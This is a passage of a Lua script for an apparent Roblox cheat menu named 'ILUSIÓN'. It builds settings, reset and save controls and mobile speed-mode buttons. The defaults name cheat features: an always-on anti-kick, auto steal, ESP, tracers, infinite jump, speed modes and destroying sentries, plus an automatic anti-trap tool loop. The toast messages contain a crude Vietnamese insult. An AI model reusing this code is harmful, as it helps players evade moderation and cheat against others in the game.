 snapHoldersLock(PlayerGui:FindFirstChild("IlusionActionButtons"))
 snapHoldersLock(PlayerGui:FindFirstChild("IlusionModeBar"))
	end)
	pcall(saveCfg)
end, 3, "guiLock")
-- Anti Kick luôn ON — chỉ hiện trạng thái, không OFF được
do
	local r = row(pageSet, 32, 4)
	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(1, -16, 1, 0)
	lbl.Position = UDim2.new(0, 8, 0, 0)
	lbl.BackgroundTransparency = 1
	lbl.Text = "Anti Kick · ALWAYS ON"
	lbl.TextColor3 = Color3.fromRGB(120, 255, 160)
	lbl.Font = Enum.Font.GothamBold
	lbl.TextSize = 12
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.Parent = r
end

section(pageSet, "* — BUTTON SHAPE", 10)
local shapeRow = row(pageSet, 38, 11)
for i, name in ipairs({ "Round", "Box", "Square" }) do
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 90, 0, 28)
	b.Position = UDim2.new(0, 12 + (i - 1) * 100, 0.5, -14)
	b.BackgroundColor3 = (St.btnShape == name) and C.accent or C.box
	b.Text = name
	b.TextColor3 = (St.btnShape == name) and Color3.fromRGB(30, 20, 30) or C.text
	b.TextSize = 12
	b.Font = Enum.Font.GothamBold
	b.AutoButtonColor = false
	b.Parent = shapeRow
	corner(b, name == "Round" and 14 or (name == "Box" and 6 or 2))
	local function pickShape()
 St.btnShape = name
 -- Áp shape ngay lên MỌI action button
 pcall(function()
 if actRefs then
 for key, e in pairs(actRefs) do
 if e and e.btn then
 applyCorner(e.btn, name)
 applyCornerToChildren(e.btn, name)
 end
 end
 end
 end)
 if _G.IlusionUpdateMobileVisuals then pcall(_G.IlusionUpdateMobileVisuals) end
 if _G.IlusionForceApplyShape then pcall(_G.IlusionForceApplyShape, name) end
 for _, ch in ipairs(shapeRow:GetChildren()) do
 if ch:IsA("TextButton") then
 local on = ch.Text == name
 ch.BackgroundColor3 = on and C.accent or C.box
 ch.TextColor3 = on and Color3.fromRGB(30, 20, 30) or C.text
 end
 end
 pcall(saveCfg)
	end
	b.MouseButton1Click:Connect(pickShape)
	b.Activated:Connect(pickShape)
	b.MouseButton1Down:Connect(pickShape)
end

section(pageSet, "* — BUTTON SIZE", 20)
function sizeRow(label, key, order)
	local r = row(pageSet, 38, order)
	local t = Instance.new("TextLabel")
	t.Size = UDim2.new(0.4, 0, 1, 0)
	t.Position = UDim2.new(0, 12, 0, 0)
	t.BackgroundTransparency = 1
	t.Text = label
	t.TextColor3 = C.text
	t.TextSize = 13
	t.Font = Enum.Font.Gotham
	t.TextXAlignment = Enum.TextXAlignment.Left
	t.Parent = r
	local val = Instance.new("TextLabel")
	val.Size = UDim2.new(0, 40, 0, 24)
	val.Position = UDim2.new(1, -120, 0.5, -12)
	val.BackgroundTransparency = 1
	val.Text = tostring(St.btnSizes[key] or 50)
	val.TextColor3 = C.text
	val.TextSize = 13
	val.Font = Enum.Font.GothamBold
	val.Parent = r
	local function mk(sign, x)
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 28, 0, 28)
 b.Position = UDim2.new(1, x, 0.5, -14)
 b.BackgroundColor3 = C.box
 b.Text = sign
 b.TextColor3 = C.text
 b.TextSize = 16
 b.Font = Enum.Font.GothamBold
 b.AutoButtonColor = false
 b.Active = true
 b.ZIndex = 30
 b.Parent = r
 corner(b, 7)
 local function fire()
 local cur = tonumber(St.btnSizes[key]) or 50
 cur = math.clamp(cur + (sign == "+" and 5 or -5), 20, 200)
 St.btnSizes[key] = cur
 val.Text = tostring(cur)
 if _G.IlusionUpdateMobileVisuals then pcall(_G.IlusionUpdateMobileVisuals) end
 if _G.IlusionApplyMobile then pcall(_G.IlusionApplyMobile) end
 -- Speed 3Mode: rebuild để áp chiều cao mới
 if key == "mode" and _G.IlusionBuildV2ModeBar then pcall(_G.IlusionBuildV2ModeBar) end
 saveCfg()
 end
 b.MouseButton1Click:Connect(fire)
 b.Activated:Connect(fire)
	end
	mk("-", -80)
	mk("+", -44)
end
sizeRow("All Scale %", "mode", 21) -- reuse mode key for display; actual all scale below
-- all scale
local scaleRow = row(pageSet, 38, 22)
local st = Instance.new("TextLabel")
st.Size = UDim2.new(0.4, 0, 1, 0)
st.Position = UDim2.new(0, 12, 0, 0)
st.BackgroundTransparency = 1
st.Text = "All Buttons Scale"
st.TextColor3 = C.text
st.TextSize = 13
st.Font = Enum.Font.Gotham
st.TextXAlignment = Enum.TextXAlignment.Left
st.Parent = scaleRow
local scaleVal = Instance.new("TextLabel")
scaleVal.Size = UDim2.new(0, 48, 0, 24)
scaleVal.Position = UDim2.new(1, -128, 0.5, -12)
scaleVal.BackgroundTransparency = 1
scaleVal.Text = tostring(math.floor(St.btnScale * 100)) .. "%"
scaleVal.TextColor3 = C.text
scaleVal.TextSize = 13
scaleVal.Font = Enum.Font.GothamBold
scaleVal.Parent = scaleRow
for _, info in ipairs({ { "-", -80 }, { "+", -44 } }) do
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 28, 0, 28)
	b.Position = UDim2.new(1, info[2], 0.5, -14)
	b.BackgroundColor3 = C.box
	b.Text = info[1]
	b.TextColor3 = C.text
	b.TextSize = 16
	b.Font = Enum.Font.GothamBold
	b.AutoButtonColor = false
	b.Active = true
	b.ZIndex = 30
	b.Parent = scaleRow
	corner(b, 7)
	function fire()
 St.btnScale = math.clamp((tonumber(St.btnScale) or 1) + (info[1] == "+" and 0.05 or -0.05), 0.3, 2.0)
 scaleVal.Text = tostring(math.floor(St.btnScale * 100)) .. "%"
 if _G.IlusionUpdateMobileVisuals then pcall(_G.IlusionUpdateMobileVisuals) end
 if _G.IlusionApplyMobile then pcall(_G.IlusionApplyMobile) end
 -- rebuild V2 bar to pick new scale defaults
 if _G.IlusionBuildV2ModeBar then pcall(_G.IlusionBuildV2ModeBar) end
 saveCfg()
	end
	b.MouseButton1Click:Connect(fire)
	b.Activated:Connect(fire)
end
sizeRow("Size: Speed 3Mode", "mode", 22.5)
sizeRow("Size: Drop", "drop", 23)
sizeRow("Size: Insta", "insta", 24)
sizeRow("Size: TP", "tp", 25)
sizeRow("Size: Sentry", "sentry", 25.5)
sizeRow("Size: Auto Steal", "steal", 26)


section(pageSet, "* — MENU UI SCALE", 28)
local menuScaleRow = row(pageSet, 36, 29)
local msl = Instance.new("TextLabel")
msl.Size = UDim2.new(0.4, 0, 1, 0)
msl.Position = UDim2.new(0, 10, 0, 0)
msl.BackgroundTransparency = 1
msl.Text = "Menu Size"
msl.TextColor3 = C.text
msl.TextSize = 12
msl.Font = Enum.Font.Gotham
msl.TextXAlignment = Enum.TextXAlignment.Left
msl.Parent = menuScaleRow
local msVal = Instance.new("TextLabel")
msVal.Size = UDim2.new(0, 40, 0, 22)
msVal.Position = UDim2.new(1, -110, 0.5, -11)
msVal.BackgroundTransparency = 1
msVal.Text = tostring(math.floor((St.menuScale or 1) * 100)) .. "%"
msVal.TextColor3 = C.text
msVal.TextSize = 12
msVal.Font = Enum.Font.GothamBold
msVal.Parent = menuScaleRow
for _, info in ipairs({{"-", -72}, {"+", -40}}) do
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 26, 0, 26)
	b.Position = UDim2.new(1, info[2], 0.5, -13)
	b.BackgroundColor3 = C.box
	b.Text = info[1]
	b.TextColor3 = C.text
	b.TextSize = 14
	b.Font = Enum.Font.GothamBold
	b.AutoButtonColor = false
	b.Active = true
	b.ZIndex = 30
	b.Parent = menuScaleRow
	corner(b, 6)
	function fire()
 St.menuScale = math.clamp((St.menuScale or 1) + (info[1] == "+" and 0.05 or -0.05), 0.7, 1.3)
 msVal.Text = tostring(math.floor(St.menuScale * 100)) .. "%"
 applyMenuScale()
 saveCfg()
	end
	b.MouseButton1Click:Connect(fire)
	b.Activated:Connect(fire)
end

section(pageSet, "* — RESET", 30)
actionBtn(pageSet, "Reset Mobile Positions", C.accent, function()
	if _G.IlusionResetMobilePos then _G.IlusionResetMobilePos() end
	saveCfg()
end, 31)
actionBtn(pageSet, "Reset All Settings", C.danger, function()
	-- full defaults
	pcall(function() setAntiGummy(true) end)
	pcall(function() setAntiRagdoll(false) end)
	pcall(function() setAntiPaint(true) end)
	pcall(function() setAntiBoogie(true) end)
	pcall(function() setToolAim(true) end)
	pcall(function() setInfJump(true) end)
	pcall(function() setDestroySentry(false) end)
	pcall(function() setSpeedOn(true) end)
	pcall(function() setActiveMode("Normal") end)
	St.dropMode = 2
	St.instaMode = "V1"
	St.mobileBtns = true
	St.showStealBtn = true
	St.guiLock = false
	St.btnShape = "Square"
	St.btnScale = 0.75
	St.menuScale = 1
	St.btnSizes = { mode = 50, drop = 50, insta = 50, tp = 50, sentry = 50, steal = 50, antitrap = 50 }
	St._btnPos = nil
	St._modeBarPos = nil
	St._miniPos = nil
	St._mainPos = nil
	St._stealBarPos = nil
	St._tpMainPos = nil
	St.stealVer = "V1"
	St.stealRadius = 60
	St.stealPause = false
	St.stealPausePct = 75
	St.autoSteal = false
	St.modes = {
 Normal = { norm = 59, steal = 30, key = Enum.KeyCode.T },
 Lagger = { norm = 18, steal = 24, key = Enum.KeyCode.Q },
 Custom = { norm = 33, steal = 33, key = Enum.KeyCode.C },
	}
	St.activeMode = "Normal"
	St.keys = {
 Drop = Enum.KeyCode.X,
 TPDown = Enum.KeyCode.F,
 InstaReset = Enum.KeyCode.Z,
 DestroySentry = Enum.KeyCode.H,
	}
	pcall(function() setESP(false) end)
	pcall(function() setTracer(false) end)
	pcall(function() setAntiLag(false) end)
	pcall(function() setSpamLaser(false) end)
	pcall(function() setSpamPaint(false) end)
	if type(setAutoSteal) == "function" then
 pcall(function() setAutoSteal(false) end)
	end
	-- sync toggle UI
	local defs = {
 antiGummy = true, antiRagdoll = false, antiPaint = true, antiBoogie = true, antiBee = false,
 toolAim = true, infJump = true, destroySentry = false, speedOn = true,
 mobileBtns = true, guiLock = false,
 showBtnPiam = true, showBtnSentry = true, showBtnAgu = true, showBtnMedu = true,
 esp = false, tracer = false, antiLag = false,
 spamLaser = false, spamPaint = false,
 autoSteal = false, stealPause = false, showTPPanel = true,
	}
	for k, v in pairs(defs) do
 if ToggleRefs[k] and ToggleRefs[k].set then
 pcall(function() ToggleRefs[k].set(v) end)
 end
	end
	if _G.IlusionResetMobilePos then pcall(_G.IlusionResetMobilePos) end
	if _G.IlusionApplyMobile then pcall(_G.IlusionApplyMobile) end
	if _G.IlusionRefreshModeCards then pcall(_G.IlusionRefreshModeCards) end
	pcall(applyMenuScale)
	if _G.IlusionSyncAutoSteal then pcall(_G.IlusionSyncAutoSteal) end
	pcall(saveCfg)
	showToast("RESET ALL ✓ Free Sell La Tuat Ngu Lon")
end, 32)
actionBtn(pageSet, "Save Now", C.accent, function()
	-- snapshot vị trí menu / mini / bar trước khi ghi
	pcall(function()
 if Main then
 St._mainPos = {Main.Position.X.Scale, Main.Position.X.Offset, Main.Position.Y.Scale, Main.Position.Y.Offset}
 end
 local mini = PlayerGui:FindFirstChild("IlusionFullMini")
 local mb = mini and mini:FindFirstChildWhichIsA("GuiObject")
 if mb then
 St._miniPos = {mb.Position.X.Scale, mb.Position.X.Offset, mb.Position.Y.Scale, mb.Position.Y.Offset}
 end
 St.menuOpen = Main and Main.Visible == true
	end)
	local ok = saveCfg()
	if ok then
 showToast("SAVED ✓ Free Sell La Tuat Ngu Lon")
	else
 showToast("SAVE FAIL (no writefile?)")
	end
end, 33)

----------------------------------------------------------------
-- MINI + CLOSE (no keybind)
----------------------------------------------------------------
local MiniGui = Instance.new("ScreenGui")
MiniGui.Name = "IlusionFullMini"
MiniGui.ResetOnSpawn = false
MiniGui.IgnoreGuiInset = true
MiniGui.DisplayOrder = 121
MiniGui.Parent = PlayerGui
-- Helper tròn khi menu ẩn (LKZ style) — kéo được, ấn mở menu
local Mini = Instance.new("TextButton")
Mini.Size = UDim2.new(0, 110, 0, 36)
Mini.Position = UDim2.new(0, 14, 0, 90)
Mini.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
Mini.Text = "ILUSIÓN"
Mini.TextColor3 = C.accent
Mini.TextSize = 12
Mini.Font = Enum.Font.GothamBold
Mini.Visible = false
Mini.AutoButtonColor = false
Mini.Parent = MiniGui
corner(Mini, 8)
local miniStroke = Instance.new("UIStroke", Mini)
miniStroke.Color = C.accent
miniStroke.Thickness = 2
miniStroke.Transparency = 0.15

do
	local dragging, dragStart, startPos, moved
	Top.InputBegan:Connect(function(input)
 if St.guiLock then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 dragStart = input.Position
 startPos = Main.Position
 input.Changed:Connect(function()
 if input.UserInputState == Enum.UserInputState.End then
 dragging = false
 St._mainPos = {Main.Position.X.Scale, Main.Position.X.Offset, Main.Position.Y.Scale, Main.Position.Y.Offset}
 St.menuOpen = Main.Visible == true
 pcall(saveCfg)
 end
 end)
 end
	end)
	UIS.InputChanged:Connect(function(input)
 if dragging and not St.guiLock and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
 local d = input.Position - dragStart
 Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
	end)
end
do
	local dragging, dragStart, startPos, moved
	-- Load vị trí nút đóng/mở đã lưu
	pcall(function()
 local p = St._miniPos
 if type(p) == "table" and p[1] ~= nil then
 Mini.Position = UDim2.new(p[1], p[2], p[3], p[4])
 end
	end)
	Mini.InputBegan:Connect(function(input)
 if St.guiLock then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 moved = false
 dragStart = input.Position
 startPos = Mini.Position
 end
	end)
	UIS.InputChanged:Connect(function(input)
 if dragging and not St.guiLock and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
 local d = input.Position - dragStart
 if math.abs(d.X) > 5 or math.abs(d.Y) > 5 then moved = true end
 if moved then
 Mini.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
 end
	end)
	UIS.InputEnded:Connect(function(input)
 if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
 if not dragging then return end
 dragging = false
 if moved and not St.guiLock then
 St._miniPos = {Mini.Position.X.Scale, Mini.Position.X.Offset, Mini.Position.Y.Scale, Mini.Position.Y.Offset}
 pcall(saveCfg)
 end
	end)
	Mini.MouseButton1Click:Connect(function()
 if moved then return end -- vừa kéo xong không mở menu
 St.menuOpen = true
 saveCfg()
 if moved then return end
 openMenu()
	end)
end

function openMenu()
	Main.Size = UDim2.new(0, MW, 0, MH)
	Main.Visible = true
	Mini.Visible = false
	St.menuOpen = true
	pcall(saveCfg)
end
function closeMenu()
	Main.Visible = false
	St.menuOpen = false
	pcall(function()
 if Main and Main.Parent then
 St._mainPos = {Main.Position.X.Scale, Main.Position.X.Offset, Main.Position.Y.Scale, Main.Position.Y.Offset}
 end
 end)
	Mini.Visible = true
	Mini.Text = "ILUSIÓN"
	pcall(function()
 local p = St._miniPos
 if type(p) == "table" and p[1] ~= nil then
 Mini.Position = UDim2.new(p[1], p[2], p[3], p[4])
 else
 Mini.Position = UDim2.new(Main.Position.X.Scale, Main.Position.X.Offset + 8, Main.Position.Y.Scale, Main.Position.Y.Offset)
 St._miniPos = {Mini.Position.X.Scale, Mini.Position.X.Offset, Mini.Position.Y.Scale, Mini.Position.Y.Offset}
 end
 end)
	pcall(saveCfg)
end
CloseBtn.Active = true
CloseBtn.ZIndex = 50
CloseBtn.MouseButton1Click:Connect(closeMenu)
CloseBtn.Activated:Connect(closeMenu)
if Helper then
	Helper.MouseButton1Click:Connect(closeMenu)
	pcall(function() Helper.Activated:Connect(closeMenu) end)
end

----------------------------------------------------------------
-- MOBILE: 3 mode + Drop + Insta + TP
----------------------------------------------------------------
local ModeGui = Instance.new("ScreenGui")
ModeGui.Name = "IlusionModeBar"
ModeGui.ResetOnSpawn = false
ModeGui.IgnoreGuiInset = true
ModeGui.DisplayOrder = 2501
ModeGui.Enabled = false
ModeGui.Parent = PlayerGui

local ActGui = Instance.new("ScreenGui")
ActGui.Name = "IlusionActionButtons"
ActGui.ResetOnSpawn = false
ActGui.IgnoreGuiInset = true
ActGui.DisplayOrder = 2500
ActGui.Enabled = false
ActGui.Parent = PlayerGui

local modeRefs = {}
local actRefs = {}

-- AUTO ANTI TRAP: función integrada sin ventana extra ni selector.
-- El botón cuadrado activa/desactiva el detector y se usa automáticamente la primera Tool disponible.
local antiTrapEnabled = false
local antiTrapLastPos = nil
local antiTrapStuckTime = 0
local antiTrapLastEquip = 0
local ANTI_TRAP_CHECK_TIME = 0.025
local ANTI_TRAP_MOVE_THRESHOLD = 0.015
local ANTI_TRAP_COOLDOWN = 0.025

local function antiTrapFindTool()
 local backpack = LP:FindFirstChildOfClass("Backpack")
 if backpack then
  for _, obj in ipairs(backpack:GetChildren()) do
   if obj:IsA("Tool") then return obj end
  end
 end
 local character = LP.Character
 if character then
  for _, obj in ipairs(character:GetChildren()) do
   if obj:IsA("Tool") then return obj end
  end
 end
 return nil
end

local function antiTrapTryUseTool()
 if not antiTrapEnabled then return end
 local now = os.clock()
 if now - antiTrapLastEquip < ANTI_TRAP_COOLDOWN then return end
 local character = LP.Character
 if not character then return end
 local humanoid = character:FindFirstChildOfClass("Humanoid")
 local tool = antiTrapFindTool()
 if not humanoid or not tool then return end
 antiTrapLastEquip = now
 pcall(function() humanoid:EquipTool(tool) end)
 task.spawn(function()
  pcall(function() tool:Activate() end)
  pcall(function() humanoid:UnequipTools() end)
 end)
end

RS.Heartbeat:Connect(function(dt)
 if not antiTrapEnabled then return end
 local character = LP.Character
 local humanoid = character and character:FindFirstChildOfClass("Humanoid")
 local root = character and character:FindFirstChild("HumanoidRootPart")
 if not humanoid or not root then antiTrapLastPos = nil; antiTrapStuckTime = 0; return end
 if not antiTrapLastPos then antiTrapLastPos = root.Position; return end
 local tryingToMove = humanoid.MoveDirection.Magnitude > 0.05
 local actuallyMoving = (root.Position - antiTrapLastPos).Magnitude > ANTI_TRAP_MOVE_THRESHOLD
 if tryingToMove and not actuallyMoving then antiTrapStuckTime += dt else antiTrapStuckTime = 0 end
 antiTrapLastPos = root.Position
 if antiTrapStuckTime >= ANTI_TRAP_CHECK_TIME then
  antiTrapStuckTime = 0
  task.spawn(antiTrapTryUseTool)
 end
end)
LP.CharacterAdded:Connect(function()
 antiTrapLastPos = nil
 antiTrapStuckTime = 0
end)

-- Shape chỉ áp dụng cho ACTION buttons (Drop/Insta/TP/Sentry/Steal).
-- 3-mode speed (Normal/Lagger/Custom) LUÔN giữ style mặc định (Pill) như video.
function applyCorner(btn, forceShape)
	local _shape = forceShape or St.btnShape or "Square"
	if _shape == "Square" then forceShape = "Square" end
	if not btn then return end
	local shape = forceShape or St.btnShape or "Square"
	-- Xoá hết UICorner cũ rồi tạo lại (tránh kẹt radius cũ)
	for _, ch in ipairs(btn:GetChildren()) do
 if ch:IsA("UICorner") then pcall(function() ch:Destroy() end) end
	end
	local rad
	if shape == "Round" then
 rad = UDim.new(1, 0) -- tròn
	elseif shape == "Box" then
 rad = UDim.new(0, 12) -- bo vừa
	elseif shape == "Pill" then
 rad = UDim.new(0, 16)
	else
 rad = UDim.new(0, 0) -- Square: sin redondeo
	end
	local c = Instance.new("UICorner")
	c.Name = "ShapeCorner"
	c.CornerRadius = rad
	c.Parent = btn
	-- đồng bộ ảnh nền / dim
	for _, ch in ipairs(btn:GetChildren()) do
 if ch:IsA("ImageLabel") or (ch:IsA("Frame") and ch.Name ~= "BtnTextOverlay") then
 for _, sub in ipairs(ch:GetChildren()) do
 if sub:IsA("UICorner") then pcall(function() sub:Destroy() end) end
 end
 local c2 = Instance.new("UICorner")
 c2.Name = "ShapeCorner"
 c2.CornerRadius = rad
 c2.Parent = ch
 end
	end
end

function applyCornerToChildren(btn, shape)
	if not btn then return end
	shape = shape or St.btnShape or "Square"
	local rad
	if shape == "Round" then rad = UDim.new(1, 0)
	elseif shape == "Box" then rad = UDim.new(0, 12)
	elseif shape == "Pill" then rad = UDim.new(0, 16)
	else rad = UDim.new(0, 0) -- Square
	end
	for _, ch in ipairs(btn:GetChildren()) do
 if ch:IsA("ImageLabel") or (ch:IsA("Frame") and ch.Name ~= "BtnTextOverlay") then
 for _, sub in ipairs(ch:GetChildren()) do
 if sub:IsA("UICorner") then pcall(function() sub:Destroy() end) end
 end
 local c = Instance.new("UICorner")
 c.Name = "ShapeCorner"
 c.CornerRadius = rad
 c.Parent = ch
 end
	end
end

local MOB_BTN_IMAGE_IDS = {
	126832513729779, 81347949983999, 76940707345653, 100648743625857,
	73857705647948, 86237559415852, 81474116937197, 86668822094069,
	108384375206363, 86791880986403, 126414648469223,
}
function applyEmpireBtnBg(btn, index)
 if not btn then return end
 local old = btn:FindFirstChild("BtnBgImage")
 if old then old:Destroy() end
 local oldDim = btn:FindFirstChild("BtnDim")
 if oldDim then oldDim:Destroy() end
 btn.BackgroundTransparency = 0
 btn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
 btn.TextColor3 = Color3.fromRGB(255, 255, 255)
 btn.TextStrokeTransparency = 1
 local corner = btn:FindFirstChildOfClass("UICorner")
 if not corner then corner = Instance.new("UICorner"); corner.Parent = btn end
 if St and St.btnShape == "Round" then
  corner.CornerRadius = UDim.new(0, 12)
 elseif St and St.btnShape == "Box" then
  corner.CornerRadius = UDim.new(0, 8)
 else
  corner.CornerRadius = UDim.new(0, 6)
 end
 local stroke = btn:FindFirstChild("BtnBorder") or btn:FindFirstChildOfClass("UIStroke")
 if not stroke then stroke = Instance.new("UIStroke"); stroke.Name = "BtnBorder"; stroke.Parent = btn end
 stroke.Color = Color3.fromRGB(225, 225, 225)
 stroke.Thickness = 1.5
 stroke.Transparency = 0.12
 stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
end

----------------------------------------------------------------
-- SPEED V2 MODE BAR (full GUI from ILUSIÓN Clean) — 3 mode
----------------------------------------------------------------
local v2BarButtons = {}
function _G.IlusionBuildV2ModeBar()
	pcall(function()
 local old = PlayerGui:FindFirstChild("IlusionV2ModeBar")
 if old then old:Destroy() end
	end)
	if not St.mobileBtns then return end
 local sc = math.clamp(tonumber(St.btnScale) or 1, 0.3, 2)
	local modeBase = tonumber(St.btnSizes and St.btnSizes.mode) or 50
	-- Size: Speed 3Mode tăng CHIỀU CAO (height), width giữ vừa đủ chữ
	local V2_BTN_H = math.max(28, math.floor(modeBase * sc))
	local V2_BTN_W = V2_BTN_H -- square speed buttons, matching the other mobile buttons
	local V2_CORNER = 6
	local MODE_COLORS = {
 Normal = { onBg = Color3.fromRGB(255,255,255), onTxt = Color3.fromRGB(0,0,0), offBg = Color3.fromRGB(28,28,28), offTxt = Color3.fromRGB(255,255,255), stroke = Color3.fromRGB(255,255,255) },
 Lagger = { onBg = Color3.fromRGB(255,255,255), onTxt = Color3.fromRGB(0,0,0), offBg = Color3.fromRGB(28,28,28), offTxt = Color3.fromRGB(255,255,255), stroke = Color3.fromRGB(255,255,255) },
 Custom = { onBg = Color3.fromRGB(255,255,255), onTxt = Color3.fromRGB(0,0,0), offBg = Color3.fromRGB(28,28,28), offTxt = Color3.fromRGB(255,255,255), stroke = Color3.fromRGB(255,255,255) },
 }

	local gui = Instance.new("ScreenGui")
	gui.Name = "IlusionV2ModeBar"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.DisplayOrder = 95
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	gui.Parent = PlayerGui
	v2BarButtons = {}
	local function styleV2Btn(btn, modeName, active)
 local col = MODE_COLORS[modeName] or MODE_COLORS.Normal
 btn.BackgroundColor3 = active and col.onBg or col.offBg
 btn.TextColor3 = active and col.onTxt or col.offTxt
 local st = btn:FindFirstChildOfClass("UIStroke")
 if st then
 st.Color = active and col.stroke or Color3.fromRGB(120, 120, 120)
 st.Transparency = active and 0.15 or 0.35
 st.Thickness = active and 1.5 or 1
 end
	end
	local function posFromSaved(modeName, order)
 local key = "V2_" .. modeName
 local t = St._btnPos and St._btnPos[key]
 if type(t) == "table" and t[1] ~= nil then
 return UDim2.new(t[1], t[2], t[3], t[4])
 end
 local gap = 10
 local total = (V2_BTN_W + gap) * 3 - gap
 return UDim2.new(0.5, -total / 2 + (order - 1) * (V2_BTN_W + gap), 1, -118)
	end
	local function saveV2Pos(modeName, holder)
 St._btnPos = St._btnPos or {}
 St._btnPos["V2_" .. modeName] = {
 holder.Position.X.Scale, holder.Position.X.Offset,
 holder.Position.Y.Scale, holder.Position.Y.Offset,
 }
 pcall(saveCfg)
	end
	local function makeV2ModeBtn(modeName, label, order)
 local holder = Instance.new("Frame")
 holder.Name = "V2MH_" .. modeName
 holder.Size = UDim2.new(0, V2_BTN_W, 0, V2_BTN_H)
 holder.Position = posFromSaved(modeName, order)
 holder.BackgroundTransparency = 1
 holder.BorderSizePixel = 0
 holder.ZIndex = 10
 holder.Active = true
 holder.Parent = gui
 local btn = Instance.new("TextButton")
 btn.Name = "V2Bar_" .. modeName
 btn.Size = UDim2.new(1, 0, 1, 0)
 btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 btn.Text = label
 btn.TextColor3 = Color3.fromRGB(255, 255, 255)
 btn.Font = Enum.Font.GothamBlack
 btn.TextSize = 13
 btn.AutoButtonColor = false
 btn.ZIndex = 12
 btn.Parent = holder
 Instance.new("UICorner", btn).CornerRadius = UDim.new(0, V2_CORNER)
 local st = Instance.new("UIStroke", btn)
 st.Thickness = 1
 st.Transparency = 0.35
 st.Color = Color3.fromRGB(120, 120, 120)
 st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 styleV2Btn(btn, modeName, St.activeMode == modeName)
 local activeInput, pressPos, holderStart = nil, nil, nil
 local moved, lastClick = false, 0
 local function runClick()
 local now = tick()
 if now - lastClick < 0.08 then return end
 lastClick = now
 if type(setActiveMode) == "function" then
 setActiveMode(modeName)
 else
 St.activeMode = modeName
 end
 for n, e in pairs(v2BarButtons) do
 if e and e.btn then styleV2Btn(e.btn, n, n == modeName) end
 end
 -- sync old modeRefs if any
 for n, e in pairs(modeRefs or {}) do
 if e and e.style then pcall(e.style, n == modeName)
 elseif e and e.btn then
 e.btn.BackgroundColor3 = (n == modeName) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(28, 28, 28)
 end
 end
 end
 btn.InputBegan:Connect(function(input)
 if input.UserInputType ~= Enum.UserInputType.Touch and input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
 activeInput = input
 pressPos = input.Position
 holderStart = holder.Position
 moved = false
 input.Changed:Connect(function()
 if input.UserInputState ~= Enum.UserInputState.End or activeInput ~= input then return end
 activeInput = nil
 if not moved then
 runClick()
 elseif not St.guiLock then
 saveV2Pos(modeName, holder)
 end
 end)
 end)
 btn.Activated:Connect(function()
 if moved then return end
 runClick()
 end)
 UIS.InputChanged:Connect(function(input)
 if not activeInput or not pressPos or not holderStart then return end
 if activeInput.UserInputType == Enum.UserInputType.Touch then
 if input ~= activeInput then return end
 elseif activeInput.UserInputType == Enum.UserInputType.MouseButton1 then
 if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
 else return end
 local dx = input.Position.X - pressPos.X
 local dy = input.Position.Y - pressPos.Y
 if math.abs(dx) > 4 or math.abs(dy) > 4 then moved = true end
 if moved and not St.guiLock then
 holder.Position = UDim2.new(holderStart.X.Scale, holderStart.X.Offset + dx, holderStart.Y.Scale, holderStart.Y.Offset + dy)
 end
 end)
 v2BarButtons[modeName] = { holder = holder, btn = btn }
 return btn
	end
	makeV2ModeBtn("Normal", "NORMAL", 1)
	makeV2ModeBtn("Lagger", "LAGGER", 2)
	makeV2ModeBtn("Custom", "CUSTOM", 3)
	_G.IlusionRefreshV2ModeBar = function()
 for n, e in pairs(v2BarButtons) do
 if e and e.btn then styleV2Btn(e.btn, n, St.activeMode == n) end
 end
	end
end


function makeModeBtn(name, order)
	-- Size Speed 3Mode: tăng chiều cao; width ổn định
	local sc = tonumber(St.btnScale) or 1
	local modeBase = tonumber(St.btnSizes and St.btnSizes.mode) or 50
	local V2_CORNER = 6
	local h = math.max(28, math.floor(modeBase * sc))
	local w = h -- square speed buttons, same shape as the other mobile buttons
	local holder = Instance.new("Frame")
	holder.Name = "M_" .. name
	holder.Size = UDim2.new(0, w, 0, h)
	local gap = 10
	local total = (w + gap) * 3 - gap
	holder.Position = UDim2.new(0.5, -total / 2 + (order - 1) * (w + gap), 1, -118)
	holder.BackgroundTransparency = 1
	holder.BorderSizePixel = 0
	holder.ZIndex = 10
	holder.Active = true
	holder.Parent = ModeGui
	-- restore saved pos
	pcall(function()
 local p = St._btnPos and St._btnPos["M_" .. name]
 if type(p) == "table" and p[1] ~= nil then
 holder.Position = UDim2.new(p[1], p[2], p[3], p[4])
 end
	end)
	local btn = Instance.new("TextButton")
	btn.Name = "ModeBtn"
	btn.Size = UDim2.new(1, 0, 1, 0)
	btn.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	btn.Text = name:upper()
	if name == "Normal" then btn.Text = "NORMAL" end
	btn.TextColor3 = Color3.fromRGB(25, 25, 30)
	btn.Font = Enum.Font.GothamBlack
	btn.TextSize = math.clamp(math.floor(h * 0.36), 11, 14)
	btn.AutoButtonColor = false
	btn.ZIndex = 12
	btn.Active = true
	btn.Parent = holder
	local corner = Instance.new("UICorner", btn)
	corner.CornerRadius = UDim.new(0, V2_CORNER)
	local st = Instance.new("UIStroke", btn)
